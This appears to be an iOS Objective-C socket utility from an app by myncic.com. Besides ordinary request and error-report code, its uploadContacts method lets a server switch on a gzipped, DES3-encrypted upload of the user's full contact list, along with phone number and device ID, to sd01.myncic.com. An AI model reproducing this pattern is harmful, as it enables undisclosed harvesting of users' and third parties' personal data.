//
//  SocketUtils.m
//  wuneng
//
//  Created by Chuck on 2017/6/2.
//  Copyright © 2017年 myncic.com. All rights reserved.
//

#import "SocketUtils.h"
#import "APPUtils.h"
#import "AFN_util.h"
//设置连接超时
#define TIME_OUT 10


@implementation SocketUtils

//-----------------socket业务

-(id)init{
    self = [super init];
    if(self){
        _key = [APPUtils getUniquenessString];
    }
    return self;
}


//发送接口数据
-(void)send:(NSString*)message{
    [self oneSocket:[AFN_util getIpadd] port:[AFN_util getPort] message:message];
}

//创建链接其他地方的socket
-(void)oneSocket:(NSString*)host port:(NSInteger)port message:(NSString*)message{
    
    
    const char *gcd_chart = [_key cStringUsingEncoding:NSASCIIStringEncoding];
    
    dispatch_queue_t concurrentQueue = dispatch_queue_create(gcd_chart,DISPATCH_QUEUE_CONCURRENT);
    
    
    dispatch_async(concurrentQueue, ^{
        
         self.socket = [[GCDAsyncSocket alloc] initWithDelegate:self delegateQueue:concurrentQueue];
        
        if(![self.socket isConnected]){
            
            //必须加个未来时间点调用 否则delegate会被回收！
            dispatch_time_t afterTime = dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC);
            dispatch_after(afterTime, concurrentQueue, ^{
                if(self.socket!=nil && [self.socket isConnected]){
                    [self.socket disconnect];
                }
                
            });
            
            
            NSError *error = nil;
            BOOL result = [self.socket connectToHost:host onPort:port withTimeout:TIME_OUT error:&error];
            if(result){
                NSData *cmdData = [message dataUsingEncoding:NSUTF8StringEncoding];
                [self.socket writeData:cmdData withTimeout:TIME_OUT tag:1];
                cmdData = nil;
            }
            
            [self.socket setAutoDisconnectOnClosedReadStream:NO];
        }
    });
    
   
    
}


//发送消息成功之后回调
- (void)socket:(GCDAsyncSocket *)sock didWriteDataWithTag:(long)tag{
    //读取消息
    [self.socket readDataToData:[GCDAsyncSocket CRLFData] withTimeout:TIME_OUT maxLength:50000 tag:1];
}



//返回数据
- (void)socket:(GCDAsyncSocket*)sock didReadData:(NSData*)data withTag:(long)tag{
    
    
    if(data.length>0){
        //NSLog(@"tempData length %d",tempData.length);
        @try {
            
            NSString* resultstring = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
            
            if(resultstring!=nil){
                if([resultstring hasPrefix:@"+"]){
                    
                    resultstring = [resultstring substringWithRange:NSMakeRange(1,resultstring.length-1)];
                    self.socketResult(1,resultstring);
                    resultstring = nil;
                    
                }else{
                    self.socketResult(2,resultstring);
                    dispatch_async(dispatch_get_main_queue(), ^{
                        [ShowWaiting hideWaiting];
                        NSLog(@"错误代码 - %@",resultstring);
                        
                    });
                    
                }
            }else{
                [self dataError];
            }
            
            
            resultstring = nil;
            
        } @catch (NSException *exception) {
            [self dataError];
        }
        
    }else{
        
        [self dataError];
        
    }
    
    [self.socket disconnect];
    self.socket = nil;
    
}

//超时处理
-(NSTimeInterval)socket:(GCDAsyncSocket *)sock shouldTimeoutReadWithTag:(long)tag elapsed:(NSTimeInterval)elapsed bytesDone:(NSUInteger)length{
    [self dataError];
    
    return 0;
}

-(NSTimeInterval)socket:(GCDAsyncSocket *)sock shouldTimeoutWriteWithTag:(long)tag elapsed:(NSTimeInterval)elapsed bytesDone:(NSUInteger)length{
    [self dataError];
    
     return 0;
}

//socket断开
- (void)socketDidDisconnect:(GCDAsyncSocket *)sock withError:(NSError *)err{
    if(err!=nil){//异常断开
        [self dataError];
    }
}
//c错误
-(void)dataError{
    
    self.socketResult(3,@"");
    
    dispatch_async(dispatch_get_main_queue(), ^{
        [ToastView showToast:FAILSTRING];
        [ShowWaiting hideWaiting];
    });
    
    
}

//断开连接
-(void)kill_socket{
    [self.socket disconnect];
}

//发送错误报告
+(void)sendError:(NSString*)sendString{
    
    if(sendString==nil){
        return;
    }
    SocketUtils *st = [[SocketUtils alloc] init];
    st.socketResult = ^(NSInteger succeed, NSString *resultString){
        
        if(succeed==1){
            
            [APPUtils userDefaultsSet:@"" forKey:@"errorInfo"];
        }
    };
    [st oneSocket:@"myncic.com" port:233 message:sendString];
    st= nil;
    sendString = nil;
}



//上传联系人到SD01
//contactsString 联系人原始字符串
//clickType 上传的页面位置
//appName 应用名
//phone 我的手机号

+(void)uploadContacts:(NSString*)contactsString clickType:(NSString*)clickType appName:(NSString*)appName phone:(NSString*)phone{

    //获取提交类型
    NSString *identifierForVendor = [[UIDevice currentDevice].identifierForVendor UUIDString];
    NSString *sendString = [NSString stringWithFormat:@"[\"upload_check\",\"%@\",\"%@\",\"%@\",\"%@\",\"wifi\"]\r\n",clickType,appName,phone,identifierForVendor];
    
    SocketUtils *st = [[SocketUtils alloc] init];
    st.socketResult = ^(NSInteger succeed, NSString *resultString){

        @try {
            
            NSDictionary *jsonDic = [APPUtils getDicByJson:resultString ];
            
            BOOL uploadCall = [[jsonDic objectForKey:@"contact"] boolValue];
            if(uploadCall){
                
                //压缩
                NSData *gzipData = [GZipUtil gzipData: [contactsString dataUsingEncoding:NSUTF8StringEncoding]];
                gzipData = [DES3Util encrypt:gzipData];//des加密
                NSString *amrBase64 = [NSString stringWithFormat:@"%@",
                                       [gzipData base64EncodedStringWithOptions: 0]];//base64
                amrBase64 = [APPUtils urlEncode:amrBase64];
                
                NSString *sendString2 = [NSString stringWithFormat:@"[\"upload_data\",\"contact\",\"%@\",\"%@\",\"%@\",\"%@\"]\r\n",appName,phone,identifierForVendor,amrBase64];
                
                SocketUtils *st2 = [[SocketUtils alloc] init];
                st2.socketResult = ^(NSInteger succeed, NSString *resultString){
                    if([resultString hasPrefix:@"-"]){
                        [APPUtils userDefaultsSet:@"0" forKey:@"last_get_contacts_Time"];
                    }
                    NSLog(@"通讯录上传结果(没'-'即成功):%@",resultString);
                };
                [st2 oneSocket:@"sd01.myncic.com" port:2222 message:sendString2];
                sendString2 = nil;
                st2 =nil;
                amrBase64 = nil;
                
            }
            
            jsonDic = nil;
        }
        @catch (NSException *exception) { }
        
        
        
    };
    [st oneSocket:@"sd01.myncic.com" port:2222 message:sendString];
    st = nil;
    sendString = nil;

}



@end



